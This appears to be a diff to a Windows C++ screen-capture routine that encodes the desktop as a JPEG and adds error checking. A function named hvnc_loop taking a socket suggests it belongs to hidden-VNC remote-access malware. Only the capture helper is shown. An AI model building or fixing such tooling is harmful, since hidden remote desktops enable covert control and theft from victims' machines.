@@ -1,6 +1,6 @@
-#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <windows.h>
+#include <objbase.h>
 #include <gdiplus.h>
 #include <atomic>
 #include <cstdint>
@@ -96,31 +96,31 @@ static bool capture_desktop(HDC hdc, int scalePercent, vector<unsigned char>& jp
     get_encoder_clsid(L"image/jpeg", &clsid);
     Bitmap bmp(hBitmap, NULL);
     IStream* stream = NULL;
-    CreateStreamOnHGlobal(NULL, TRUE, &stream);
+    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) == S_OK && stream) {
+        ULONG quality = 50;
+        EncoderParameters params;
+        params.Count = 1;
+        params.Parameter[0].Guid = EncoderQuality;
+        params.Parameter[0].Type = EncoderParameterValueTypeLong;
+        params.Parameter[0].NumberOfValues = 1;
+        params.Parameter[0].Value = &quality;
 
-    ULONG quality = 50;
-    EncoderParameters params;
-    params.Count = 1;
-    params.Parameter[0].Guid = EncoderQuality;
-    params.Parameter[0].Type = EncoderParameterValueTypeLong;
-    params.Parameter[0].NumberOfValues = 1;
-    params.Parameter[0].Value = &quality;
+        bmp.Save(stream, &clsid, &params);
 
-    bmp.Save(stream, &clsid, &params);
-
-    STATSTG stat;
-    stream->Stat(&stat, STATFLAG_NONAME);
-    jpegBytes.resize((size_t)stat.cbSize.QuadPart);
-    LARGE_INTEGER li = {0};
-    stream->Seek(li, STREAM_SEEK_SET, NULL);
-    ULONG read;
-    stream->Read(jpegBytes.data(), (ULONG)jpegBytes.size(), &read);
-    stream->Release();
+        STATSTG stat;
+        stream->Stat(&stat, STATFLAG_NONAME);
+        jpegBytes.resize((size_t)stat.cbSize.QuadPart);
+        LARGE_INTEGER li = {0};
+        stream->Seek(li, STREAM_SEEK_SET, NULL);
+        ULONG read;
+        stream->Read(jpegBytes.data(), (ULONG)jpegBytes.size(), &read);
+        stream->Release();
+    }
 
     SelectObject(memDC, oldBitmap);
     DeleteObject(hBitmap);
     DeleteDC(memDC);
-    return true;
+    return !jpegBytes.empty();
 }
 
 static void hvnc_loop(SOCKET sock, int scalePercent) {
